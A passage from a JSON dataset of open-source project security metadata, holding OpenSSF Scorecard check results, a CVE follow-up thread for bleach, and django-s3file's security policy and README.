                "body": "Hi!\r\n\r\nThe [ReDoS](https://en.wikipedia.org/wiki/ReDoS) fixed in 3.1.4 does not seem to have a CVE. Have you considered requesting a CVE for this?",
                "comments": [
                    {
                        "body": "Yep! It's somewhat complicated because Mozilla assigns the CVE (not Github), but the reporter already requested one on the security@mozilla.org mailing list.\r\n\r\nI'll leave this open until one is assigned them update the advisory.\r\n\r\nThanks for following up!",
                        "user": "g-k",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2020-03-27T14:05:20Z",
                        "url": "https://github.com/mozilla/bleach/issues/527#issuecomment-605018787"
                    },
                    {
                        "body": "@hartwork this was assigned CVE-2020-6817. I added the link to it on mitre https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6817 which include the advisory details soon.",
                        "user": "g-k",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2020-03-30T19:39:24Z",
                        "url": "https://github.com/mozilla/bleach/issues/527#issuecomment-606203934"
                    },
                    {
                        "body": "Thank you!",
                        "user": "hartwork",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-03-30T19:42:28Z",
                        "url": "https://github.com/mozilla/bleach/issues/527#issuecomment-606205413"
                    }
                ],
                "pull_request": null
            }
        ],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 1,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "codingjoe/django-s3file",
        "project_url": "https://github.com/codingjoe/django-s3file",
        "SSF": {
            "date": "2024-10-29T23:02:25+07:00",
            "repo": {
                "name": "github.com/codingjoe/django-s3file",
                "commit": "b852632194253170e339dbc396ccf48dadc4d507"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.3,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'main'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "29 out of 29 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 2,
                    "reason": "Found 1/4 approved changesets -- score normalized to 2",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: github-beta contributor org/company found, jazzband contributor org/company found, FussyFox contributor org/company found, voiio contributor org/company found, pyupio contributor org/company found, shining panda s.a.s. contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 6 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: MIT License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 9,
                    "reason": "9 commit(s) and 2 issue activity found in the last 90 days -- score normalized to 9",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:77: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:79: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:109: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:117: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yml:122: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:142: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:145: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:151: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:155: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:52: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release.yml:12: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/release.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/release.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/codingjoe/django-s3file/release.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:19",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:58",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:94",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:95",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:121",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release.yml:17",
                        "Info:   0 out of  18 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   1 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   6 pipCommand dependencies pinned",
                        "Info:   2 out of   2 npmCommand dependencies pinned"
                    ],
                    "score": 1,
                    "reason": "dependency not pinned by hash detected -- score normalized to 1",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Info: all commits (29) are checked with a SAST tool"
                    ],
                    "score": 10,
                    "reason": "SAST tool is run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/ci.yml:131",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/ci.yml:132",
                        "Warn: no topLevel permission defined: .github/workflows/ci.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-c2qf-rxjj-qqgw"
                    ],
                    "score": 9,
                    "reason": "1 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/codingjoe/django-s3file/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Security Considerations\n\nThe wake of CVE-2022-24840 revealed the importance to document security considerations.\nThe following attack vectors have been considered during development. Should there be\na possible vector or consideration missing, please contact the maintainers, as described\nbelow.\n\nWe use [pre-signed POST URLs](s3-pre-signed-url) to upload files to AWS S3.\n[Django's internal signer](django-signing) is used to sign the upload path and validate\nit before fetching files from S3.\n\nPlease note, that Django's signer uses the `SECRET_KEY`, rotating the key will void all\nsignatures. Should you rotate the secret key, between a form GET and POST request, the\nform will fail. Similarly, Django will expire all sessions if you rotate the key.\n\n[s3-pre-signed-url]: https://boto3.amazonaws.com/v1/documentation/api/latest/guide/s3-presigned-urls.html\n[django-signing]: https://docs.djangoproject.com/en/stable/topics/signing/\n\n### Upload of malicious files\n\nAWS S3 supports MIME type detection and content-type enforcement.\nYou can limit the upload of malicious files via the MIME type [accept][accept].\nHowever, this is not a security measure, and you should always validate files before\nprocessing them.\n\n[accept]: https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/accept\n\n### Request file injection\n\nThough files can always be included in a request, CVE-2022-24840 revealed that we need\nto consider people injecting any files that reside on your S3 bucket. However, we do\npresign the upload location and validate it before fetching files from S3.\n\n### Path traversal & timing attacks\n\nWe fetch files from your S3 bucket. This behavior could be used to brute force valid\nfile names. We mitigate this by signing the allowed upload path and validating it.\nThe upload path is unique for each file input and request. Therefore, an attacker can\nnot escape and access any files but the one uploaded by the attacker.\n\n## Reporting a Vulnerability\n\nNEVER open an issue or discussion to report a vulnerability.\n\nTo report a security vulnerability, please use the\n[Tidelift security contact](https://tidelift.com/security).\nTidelift will coordinate the fix and disclosure.\n\nYou may also contact one of the maintainers of the project either via email or Telegram:\n\n* Email: [johannes@maron.family](mailto:johannes@maron.family)\n* Telegram: [@codingjoe](https://t.me/codingjoe)\n",
        "project_all_labels": [
            "bug",
            "dependencies",
            "duplicate",
            "enhancement",
            "github_actions",
            "help wanted",
            "invalid",
            "javascript",
            "python",
            "question",
            "wontfix"
        ],
        "README_content": "# django-s3file\n\nA lightweight file upload input for Django and Amazon S3.\n\nDjango-S3File allows you to upload files directly AWS S3 effectively\nbypassing your application server. This allows you to avoid long running\nrequests from large file uploads. This is particularly helpful for if\nyou run your service on AWS Lambda or Heroku where you have a hard\nrequest limit.\n\n[![PyPi\nVersion](https://img.shields.io/pypi/v/django-s3file.svg)](https://pypi.python.org/pypi/django-s3file/)\n[![Test\nCoverage](https://codecov.io/gh/codingjoe/django-s3file/branch/main/graph/badge.svg)](https://codecov.io/gh/codingjoe/django-s3file)\n[![GitHub\nlicense](https://img.shields.io/badge/license-MIT-blue.svg)](https://raw.githubusercontent.com/codingjoe/django-s3file/main/LICENSE)\n\n## Features\n\n-   lightweight: less 200 lines\n-   no JavaScript or Python dependencies (no jQuery)\n-   easy integration\n-   works just like the built-in\n-   extendable JavaScript API\n\n## For the Nerds\n\n```mermaid\nsequenceDiagram\n    autonumber\n    actor Browser\n    participant S3\n    participant Middleware\n    Browser->>Django: GET form view\n    activate Django\n    Django->>Browser: RESPONSE w/ presigned POST URL & signed middleware key\n    deactivate Django\n    Browser->>S3: POST large file\n    activate S3\n    S3->>Browser: RESPONSE AWS S3 key\n    Browser->>Middleware: POST AWS S3 key (signed)\n    activate Middleware\n    Middleware->>S3: GET AWS S3 key\n    S3->>Middleware: RESPONSE large file promise\n    deactivate S3\n    Middleware->>Django: request incl. large file promise\n    deactivate Middleware\n    activate Django\n    opt only if files is procssed by Django\n        Django-->>S3: GET large file\n        activate S3\n        S3-->>Django: RESPONSE large file\n        deactivate S3\n    end\n    Django->>Browser: RESPONSE success\n    deactivate Django\n```\n\nIn a nutshell, we can bypass Django completely and have AWS handle\nthe upload or any processing. Of course, if you want to do something\nwith your file in Django, you can do so, just like before, with the\nadded advantage, that your file is served from within your datacenter.\n\n## Installation\n\nMake sure you have [Amazon S3\nstorage](http://django-storages.readthedocs.io/en/latest/backends/amazon-S3.html)\nsetup correctly.\n\nJust install S3file using `pip`.\n\n```bash\npip install django-s3file\n# or\npipenv install django-s3file\n```\n\nAdd the S3File app and middleware in your settings:\n\n```python\n# settings.py\n\nINSTALLED_APPS = (\n    '...',\n    's3file',\n    '...',\n)\n\nMIDDLEWARE = (\n    '...',\n    's3file.middleware.S3FileMiddleware',\n    '...',\n)\n```\n\n## Usage\n\nS3File automatically replaces Django's `ClearableFileInput` widget, you\ndo not need to alter your code at all.\n\nThe `ClearableFileInput` widget is only than automatically replaced when\nthe `STORAGES[\"default\"]` setting is set to `django-storages`'\n`S3Boto3Storage` or the dummy `FileSystemStorage` is enabled.\n\n### Setting up the AWS S3 bucket\n\n#### Upload folder\n\nS3File uploads to a single folder. Files are later moved by Django when\nthey are saved to the `upload_to` location.\n\nIt is recommended to [setup\nexpiration](http://docs.aws.amazon.com/AmazonS3/latest/dev/intro-lifecycle-rules.html)\nfor that folder, to ensure that old and unused file uploads don't add up\nand produce costs.\n\nThe default folder name is: `tmp/s3file` You can change it by changing\nthe `S3FILE_UPLOAD_PATH` setting.\n\n#### CORS policy\n\nYou will need to allow `POST` from all origins. Just add the following\nto your CORS policy.\n\n```json\n[\n  {\n    \"AllowedHeaders\": [\n        \"*\"\n    ],\n    \"AllowedMethods\": [\n        \"POST\"\n    ],\n    \"AllowedOrigins\": [\n        \"*\"\n    ],\n    \"ExposeHeaders\": [],\n    \"MaxAgeSeconds\": 3000\n  }\n]\n```\n\n### Progress Bar\n\nS3File does emit progress signals that can be used to display some kind\nof progress bar. Signals named `progress` are emitted for both each\nindividual file input as well as for the form as a whole.\n\nThe progress signal carries the following details:\n\n```javascript\nconsole.log(event.detail)\n\n{\n    progress: 0.4725307607171312  // total upload progress of either a form or single input\n    loaded: 1048576  // total upload progress of either a form or single input\n    total: 2219064  // total bytes to upload\n    currentFile: File {…}  // file object\n    currentFileName: \"text.txt\"  // file name of the file currently uploaded\n    currentFileProgress: 0.47227834703299176  // upload progress of that file\n    originalEvent: ProgressEvent {…} // the original XHR onprogress event\n}\n```\n\nThe following example implements a Boostrap progress bar for upload\nprogress of an entire form.\n\n```html\n<div class=\"progress\">\n  <div class=\"progress-bar\" role=\"progressbar\" style=\"width: 0%;\" aria-valuenow=\"0\" aria-valuemin=\"0\" aria-valuemax=\"100\">0%</div>\n</div>\n```\n\n```javascript\n(function () {\n    var form = document.getElementsByTagName('form')[0]\n    var progressBar = document.getElementsByClassName('progress-bar')[0]\n\n    form.addEventListener('progress', function (event) {\n        // event.detail.progress is a value between 0 and 1\n        var percent = Math.round(event.detail.progress * 100)\n\n        progressBar.setAttribute('style', 'width:' + percent + '%')\n        progressBar.setAttribute('aria-valuenow', percent)\n        progressBar.innerText = percent + '%'\n    })\n})()\n```\n\n### Using S3File in development\n\nUsing S3File in development can be helpful especially if you want to use\nthe progress signals described above. Therefore, S3File comes with a AWS\nS3 dummy backend. It behaves similar to the real S3 storage backend. It\nis automatically enabled, if the `DEFAULT_FILE_STORAGE` setting is set\nto `FileSystemStorage`.\n\nTo prevent users from accidentally using the `FileSystemStorage` and the\ninsecure S3 dummy backend in production, there is also an additional\ndeployment check that will error if you run Django\\'s deployment check\nsuite:\n\n```shell\npython manage.py check --deploy\n```\n\nWe recommend always running the deployment check suite as part of your\ndeployment pipeline.\n\n### Uploading multiple files\n\nDjango does have limited support for [uploading multiple\nfiles](https://docs.djangoproject.com/en/stable/topics/http/file-uploads/#uploading-multiple-files).\nS3File fully supports this feature. The custom middleware makes ensure\nthat files are accessible via `request.FILES`, even though they have\nbeen uploaded to AWS S3 directly and not to your Django application\nserver.\n\n### Using optimized S3Boto3Storage\n\nSince `S3Boto3Storage` supports storing data from any other fileobj, it\nuses a generalized `_save` function. This leads to the frontend\nuploading the file to S3 and then copying it byte-by-byte to perform a\nmove operation just to rename the uploaded object. For large files this\nleads to additional loading times for the user.\n\nThat\\'s why S3File provides an optimized version of this method at\n`storages_optimized.S3OptimizedUploadStorage`. It uses the more\nefficient `copy` method from S3, given that we know that we only copy\nfrom one S3 location to another.\n\n```python\nfrom s3file.storages_optimized import S3OptimizedUploadStorage\n\nclass MyStorage(S3OptimizedUploadStorage):  # Subclass and use like any other storage\n    default_acl = 'private'\n```\n",
        "num_commits": 353,
        "project_age_days": 3641,
        "project_created_at": "2014-11-10",
        "latest_updated_at": "2024-10-10",
        "latest_pushed_at": "2024-10-29",
        "num_contributors": 14,
        "num_pull": 271,
        "num_issues": 307,
        "num_opening_issue": 5,
        "project_size(kB)": 708,
        "num_stargazers": 79,
        "num_watchers": 79,
        "num_forks": 16,
        "num_subscribers": 10,
        "SecurityPolicy_created_at": "2022-06-06 10:38:02",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "3e17d58d523323cf60476478119e65e73b514d7b",
                "url": "https://github.com/codingjoe/django-s3file/commit/3e17d58d523323cf60476478119e65e73b514d7b",
                "date": "2022-10-14 08:38:45"
            },
            {
                "commit_id": "d3d3dbcd3cc7cd869bdbc676dce8ce5da0d11b09",
                "url": "https://github.com/codingjoe/django-s3file/commit/d3d3dbcd3cc7cd869bdbc676dce8ce5da0d11b09",
                "date": "2022-06-06 10:38:02"
            },
            {
                "commit_id": "b0d007e06167e03bde3bc1697c730764ce0a0a33",
                "url": "https://github.com/codingjoe/django-s3file/commit/b0d007e06167e03bde3bc1697c730764ce0a0a33",
                "date": "2022-06-06 10:38:02"
            },
            {
                "commit_id": "10ec9d9af6d5bc7f5e7f3d3369815c4348b24240",
                "url": "https://github.com/codingjoe/django-s3file/commit/10ec9d9af6d5bc7f5e7f3d3369815c4348b24240",
                "date": "2022-06-06 10:38:02"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email_external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "User guideline",
            "User guideline",
            "User guideline",
            "User guideline",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "codecov/codecov-python",
        "project_url": "https://github.com/codecov/codecov-python",
        "SSF": {
            "date": "2024-10-30T01:05:31+07:00",
            "repo": {
                "name": "github.com/codecov/codecov-python",
                "commit": "e553e93ed1404095acaf9a8bc3ef239675d3b88e"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.2,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'master'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 out of 28 merged PRs checked by a CI test -- score normalized to 0",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 8,
                    "reason": "Found 21/24 approved changesets -- score normalized to 8",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: NaNoGenMo contributor org/company found, ultrajson contributor org/company found, freelancer up for hire contributor org/company found, pywikibot contributor org/company found, summerofcode contributor org/company found, codecov contributor org/company found, python-pillow contributor org/company found, awesomeWM contributor org/company found, NaPoGenMo contributor org/company found, citybikes contributor org/company found, deadsetbit contributor org/company found, zlib-ng contributor org/company found, Vimjas contributor org/company found, moremoban contributor org/company found, WahKazoo contributor org/company found, pylast contributor org/company found, pytest-dev contributor org/company found, python-twitter-tools contributor org/company found, Nuitka contributor org/company found, django contributor org/company found, unitedstates contributor org/company found, python-humanize contributor org/company found, flake8-implicit-str-concat contributor org/company found, py2many contributor org/company found, fatiando contributor org/company found, helsinki-python contributor org/company found, yourlabs contributor org/company found, neomake contributor org/company found, BesutKode contributor org/company found, Blosc contributor org/company found, termcolor contributor org/company found, gsocindonesia contributor org/company found, editorconfig contributor org/company found, snxd contributor org/company found, wikimedia contributor org/company found, TruthfulTechnology contributor org/company found, PyCQA contributor org/company found, coala contributor org/company found, loklak contributor org/company found, jazzband contributor org/company found, truthfultechnology contributor org/company found, whyaretheflagsup contributor org/company found, mobbler contributor org/company found, sandiegopython contributor org/company found, endoflife-date contributor org/company found, franklin-ai contributor org/company found, whissip contributor org/company found, python-attrs contributor org/company found, MediumCendekia contributor org/company found, fossasia contributor org/company found, python contributor org/company found, psf contributor org/company found, cycle148hki contributor org/company found, nordsoftware contributor org/company found, testbed contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 55 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": [
                        "Warn: Repository is archived."
                    ],
                    "score": 0,
                    "reason": "project is archived",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
